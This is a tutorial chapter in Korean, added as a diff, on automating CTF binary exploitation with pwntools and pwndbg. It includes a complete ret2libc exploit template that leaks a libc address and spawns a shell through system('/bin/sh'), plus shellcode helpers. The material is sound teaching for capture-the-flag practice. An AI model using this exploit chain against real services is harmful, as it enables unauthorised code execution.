@@ -1,0 +1,259 @@
+<div class="page-header">
+  <div class="chapter-label">Chapter 10 · Part 4 — 고급 활용</div>
+  <h2>pwntools 연동 & 자동화</h2>
+  <p class="subtitle">pwndbg로 분석하고 pwntools로 자동화한다 — 이 둘이 분리되면 CTF는 못 푼다</p>
+</div>
+
+<div class="callout info">
+  <span class="callout-icon">📌</span>
+  <div class="callout-body">
+    <strong>이 챕터에서 배울 것</strong>
+    <p>gdb.attach() 패턴, process()·remote() 연결, context 설정, pwntools 핵심 유틸리티, pwndbg + pwntools 동시 사용 워크플로우, 완전한 익스플로잇 스크립트 템플릿.</p>
+  </div>
+</div>
+
+<h3>왜 pwntools인가</h3>
+
+<p>
+  pwndbg로 오프셋, 가젯 주소, libc 오프셋을 모두 파악했다. 이제 익스플로잇을 실행해야 한다. 터미널에서 수동으로 페이로드를 보내는 건 한계가 있다 — 특히 여러 단계의 입출력이 필요한 경우. pwntools는 프로세스/네트워크 연결, 페이로드 조립, 패킹/언패킹, 패턴 생성을 Python으로 자동화한다.
+</p>
+
+<h3>pwntools 설치 & context 설정</h3>
+
+<pre><code><span class="cm"># 설치</span>
+pip install pwntools
+
+<span class="cm"># 기본 임포트</span>
+<span class="kw">from</span> pwn <span class="kw">import</span> *
+
+<span class="cm"># context — 아키텍처와 OS 설정</span>
+context.arch = <span class="str">'amd64'</span>      <span class="cm"># x86_64</span>
+context.arch = <span class="str">'i386'</span>       <span class="cm"># x86 32bit</span>
+context.arch = <span class="str">'arm'</span>        <span class="cm"># ARM 32bit</span>
+context.arch = <span class="str">'aarch64'</span>    <span class="cm"># ARM 64bit</span>
+context.os   = <span class="str">'linux'</span>      <span class="cm"># 기본값</span>
+context.log_level = <span class="str">'debug'</span> <span class="cm"># 모든 통신 로그 출력 (디버깅 시)</span>
+context.log_level = <span class="str">'info'</span>  <span class="cm"># 기본</span>
+
+<span class="cm"># 한 줄로 설정</span>
+context.update(arch=<span class="str">'amd64'</span>, os=<span class="str">'linux'</span>, log_level=<span class="str">'debug'</span>)</code></pre>
+
+<h3>process() & remote() — 연결</h3>
+
+<pre><code><span class="cm"># 로컬 프로세스 실행</span>
+p = process(<span class="str">'./vuln'</span>)
+p = process([<span class="str">'./vuln'</span>, <span class="str">'arg1'</span>])           <span class="cm"># 인자 있을 때</span>
+p = process(<span class="str">'./vuln'</span>, env={<span class="str">'MYVAR'</span>: <span class="str">'value'</span>}) <span class="cm"># 환경변수</span>
+
+<span class="cm"># 원격 서버 연결</span>
+p = remote(<span class="str">'ctf.example.com'</span>, <span class="num">1337</span>)
+
+<span class="cm"># 로컬/원격 전환 (CTF 표준 패턴)</span>
+<span class="kw">if</span> args.REMOTE:
+    p = remote(<span class="str">'ctf.example.com'</span>, <span class="num">1337</span>)
+<span class="kw">else</span>:
+    p = process(<span class="str">'./vuln'</span>)</code></pre>
+
+<h3>gdb.attach() — pwndbg + pwntools 동시 사용</h3>
+
+<p>
+  pwntools로 프로세스를 시작하고, pwndbg를 해당 프로세스에 붙이는 패턴이다. 페이로드를 자동으로 보내면서 pwndbg에서 실시간으로 상태를 볼 수 있다.
+</p>
+
+<pre><code><span class="kw">from</span> pwn <span class="kw">import</span> *
+
+context.update(arch=<span class="str">'amd64'</span>, os=<span class="str">'linux'</span>)
+p = process(<span class="str">'./vuln'</span>)
+
+<span class="cm"># 방법 1: 별도 터미널에 GDB 창 열기</span>
+gdb.attach(p)           <span class="cm"># 새 터미널 창에서 pwndbg가 열림</span>
+pause()                 <span class="cm"># GDB 준비될 때까지 대기</span>
+
+<span class="cm"># 방법 2: GDB 명령어와 함께 attach (브레이크포인트 포함)</span>
+gdb.attach(p, <span class="str">"""
+    break *0x401234
+    continue
+"""</span>)
+
+<span class="cm"># 방법 3: tmux 사용 (자동 분할)</span>
+context.terminal = [<span class="str">'tmux'</span>, <span class="str">'splitw'</span>, <span class="str">'-h'</span>]
+gdb.attach(p, <span class="str">"""
+    break main
+    continue
+"""</span>)
+
+<span class="cm"># 방법 4: gdbserver 경유 (원격에서도 디버깅)</span>
+p = process(<span class="str">'./vuln'</span>)
+gdb.attach(p, gdbscript=<span class="str">"break *0x401234\ncontinue"</span>)</code></pre>
+
+<h3>입출력 — 데이터 보내고 받기</h3>
+
+<pre><code><span class="cm"># 데이터 보내기</span>
+p.send(payload)             <span class="cm"># 개행 없이</span>
+p.sendline(payload)         <span class="cm"># + \n</span>
+p.sendafter(b"Input: ", payload)   <span class="cm"># 특정 출력 후 전송</span>
+p.sendlineafter(b">>> ", payload)  <span class="cm"># 개행 포함</span>
+
+<span class="cm"># 데이터 받기</span>
+data = p.recv(8)            <span class="cm"># 정확히 8바이트</span>
+data = p.recvline()         <span class="cm"># 개행까지 한 줄</span>
+data = p.recvuntil(b"end")  <span class="cm"># "end" 나올 때까지</span>
+data = p.recvall()          <span class="cm"># 프로세스 종료까지 전부</span>
+
+<span class="cm"># 인터랙티브 모드 (셸 획득 후)</span>
+p.interactive()             <span class="cm"># 터미널처럼 직접 입력</span></code></pre>
+
+<h3>페이로드 조립 유틸리티</h3>
+
+<pre><code><span class="cm"># 패킹 — 정수를 리틀엔디언 바이트로</span>
+p64(<span class="num">0x401234</span>)        <span class="cm"># 8바이트, little endian</span>
+p32(<span class="num">0x401234</span>)        <span class="cm"># 4바이트</span>
+p16(<span class="num">0x1234</span>)          <span class="cm"># 2바이트</span>
+p8(<span class="num">0x41</span>)             <span class="cm"># 1바이트</span>
+
+<span class="cm"># 언패킹 — 바이트를 정수로</span>
+u64(data[:8])         <span class="cm"># 8바이트 little endian → int</span>
+u32(data[:4])
+
+<span class="cm"># flat() — 페이로드 평탄화 (권장)</span>
+payload = flat(
+    <span class="str">b"A"</span> * <span class="num">72</span>,          <span class="cm"># 패딩</span>
+    <span class="num">0x40101a</span>,           <span class="cm"># ret 가젯 (p64 자동 적용)</span>
+    <span class="num">0x40119e</span>,           <span class="cm"># pop rdi ; ret</span>
+    <span class="num">0x7ffff7b97e9a</span>,    <span class="cm"># "/bin/sh"</span>
+    <span class="num">0x7ffff7a52290</span>,    <span class="cm"># system()</span>
+)
+
+<span class="cm"># cyclic (pwntools CLI와 동일)</span>
+pattern = cyclic(<span class="num">200</span>)
+offset  = cyclic_find(<span class="num">0x6161616a</span>)   <span class="cm"># 오프셋 계산</span></code></pre>
+
+<h3>ELF & libc 파싱</h3>
+
+<pre><code><span class="cm"># ELF 객체로 주소 추출</span>
+elf = ELF(<span class="str">'./vuln'</span>)
+
+<span class="cm"># 함수/심볼 주소</span>
+elf.sym[<span class="str">'main'</span>]         <span class="cm"># main() 주소</span>
+elf.sym[<span class="str">'win'</span>]          <span class="cm"># win() 주소</span>
+elf.plt[<span class="str">'puts'</span>]         <span class="cm"># puts@plt 주소</span>
+elf.got[<span class="str">'puts'</span>]         <span class="cm"># puts@got 주소</span>
+
+<span class="cm"># libc 파싱 (제공된 libc.so.6 이용)</span>
+libc = ELF(<span class="str">'./libc.so.6'</span>)
+libc.sym[<span class="str">'system'</span>]      <span class="cm"># libc 내 system 오프셋</span>
+libc.sym[<span class="str">'__libc_start_main'</span>]
+
+<span class="cm"># libc 릭으로 base 계산</span>
+leaked_puts = u64(p.recvuntil(<span class="str">b"\n"</span>, drop=<span class="kw">True</span>).ljust(<span class="num">8</span>, <span class="str">b"\x00"</span>))
+libc.address = leaked_puts - libc.sym[<span class="str">'puts'</span>]   <span class="cm"># base 계산</span>
+system_addr = libc.sym[<span class="str">'system'</span>]               <span class="cm"># 실제 system() 주소</span>
+bin_sh_addr = next(libc.search(<span class="str">b"/bin/sh"</span>))     <span class="cm"># "/bin/sh" 주소</span></code></pre>
+
+<h3>완전한 익스플로잇 스크립트 템플릿</h3>
+
+<pre><code><span class="cm">#!/usr/bin/env python3</span>
+<span class="cm"># CTF 익스플로잇 표준 템플릿</span>
+<span class="kw">from</span> pwn <span class="kw">import</span> *
+
+<span class="cm"># ── 설정 ──────────────────────────────────</span>
+context.update(arch=<span class="str">'amd64'</span>, os=<span class="str">'linux'</span>)
+context.terminal = [<span class="str">'tmux'</span>, <span class="str">'splitw'</span>, <span class="str">'-h'</span>]
+
+elf  = ELF(<span class="str">'./vuln'</span>,   checksec=<span class="kw">False</span>)
+libc = ELF(<span class="str">'./libc.so.6'</span>, checksec=<span class="kw">False</span>)
+
+<span class="cm"># ── 연결 ──────────────────────────────────</span>
+<span class="kw">def</span> <span class="fn">conn</span>():
+    <span class="kw">if</span> args.REMOTE:
+        <span class="kw">return</span> remote(<span class="str">'ctf.example.com'</span>, <span class="num">1337</span>)
+    p = process(elf.path)
+    <span class="kw">if</span> args.GDB:
+        gdb.attach(p, <span class="str">"""
+            break *main+100
+            continue
+        """</span>)
+    <span class="kw">return</span> p
+
+<span class="cm"># ── 상수 ──────────────────────────────────</span>
+OFFSET   = <span class="num">72</span>                    <span class="cm"># cyclic으로 구한 오프셋</span>
+POP_RDI  = <span class="hex">0x40119e</span>              <span class="cm"># pop rdi ; ret</span>
+RET      = <span class="hex">0x40101a</span>              <span class="cm"># ret (스택 정렬)</span>
+PUTS_PLT = elf.plt[<span class="str">'puts'</span>]
+PUTS_GOT = elf.got[<span class="str">'puts'</span>]
+MAIN     = elf.sym[<span class="str">'main'</span>]
+
+<span class="cm"># ── Phase 1: libc 릭 ──────────────────────</span>
+<span class="kw">def</span> <span class="fn">exploit</span>():
+    p = <span class="fn">conn</span>()
+
+    <span class="cm"># puts(got_puts) → libc 주소 릭</span>
+    leak_payload = flat(
+        <span class="str">b"A"</span> * OFFSET,
+        POP_RDI, PUTS_GOT,    <span class="cm"># rdi = &puts@got</span>
+        PUTS_PLT,             <span class="cm"># call puts → print puts 주소</span>
+        MAIN                  <span class="cm"># 돌아와서 main 재실행</span>
+    )
+
+    p.sendlineafter(<span class="str">b"Input: "</span>, leak_payload)
+    leaked = u64(p.recvline().strip().ljust(<span class="num">8</span>, <span class="str">b"\x00"</span>))
+    log.success(<span class="str">f"Leaked puts: {hex(leaked)}"</span>)
+
+    <span class="cm"># libc base 계산</span>
+    libc.address = leaked - libc.sym[<span class="str">'puts'</span>]
+    log.success(<span class="str">f"libc base: {hex(libc.address)}"</span>)
+
+    <span class="cm"># ── Phase 2: system("/bin/sh") ─────────</span>
+    system  = libc.sym[<span class="str">'system'</span>]
+    bin_sh  = next(libc.search(<span class="str">b"/bin/sh"</span>))
+
+    shell_payload = flat(
+        <span class="str">b"A"</span> * OFFSET,
+        RET,                  <span class="cm"># 스택 정렬</span>
+        POP_RDI, bin_sh,      <span class="cm"># rdi = "/bin/sh"</span>
+        system                <span class="cm"># call system</span>
+    )
+
+    p.sendlineafter(<span class="str">b"Input: "</span>, shell_payload)
+    p.interactive()
+
+<span class="fn">exploit</span>()</code></pre>
+
+<h3>pwntools 자주 쓰는 유틸리티</h3>
+
+<div class="cmd-grid">
+  <div class="cmd-card">
+    <code>asm("nop")</code>
+    <p>어셈블리를 바이트로 변환. context.arch 기준.</p>
+  </div>
+  <div class="cmd-card">
+    <code>disasm(bytes)</code>
+    <p>바이트를 어셈블리로 역변환.</p>
+  </div>
+  <div class="cmd-card">
+    <code>enhex(data)</code>
+    <p>바이트를 hex 문자열로. <code>unhex()</code>는 역변환.</p>
+  </div>
+  <div class="cmd-card">
+    <code>xor(data, key)</code>
+    <p>XOR 암호화/복호화.</p>
+  </div>
+  <div class="cmd-card">
+    <code>shellcraft.sh()</code>
+    <p>현재 아키텍처에 맞는 셸 실행 셸코드 생성.</p>
+  </div>
+  <div class="cmd-card">
+    <code>ROP(elf)</code>
+    <p>pwntools 내장 ROP 체인 빌더.</p>
+  </div>
+</div>
+
+<div class="callout tip">
+  <span class="callout-icon">💡</span>
+  <div class="callout-body">
+    <strong>python3 solve.py GDB 로 빠르게 디버깅</strong>
+    <p>
+      <code>args.GDB</code>를 쓰면 <code>python3 solve.py GDB</code> 실행 시에만 gdb.attach()가 호출된다. 평소엔 빠르게 실행하고, 디버깅이 필요할 때만 GDB를 붙일 수 있다. <code>args.REMOTE</code>도 마찬가지로 <code>python3 solve.py REMOTE</code>일 때만 원격으로 연결한다.
+    </p>
+  </div>
+</div>
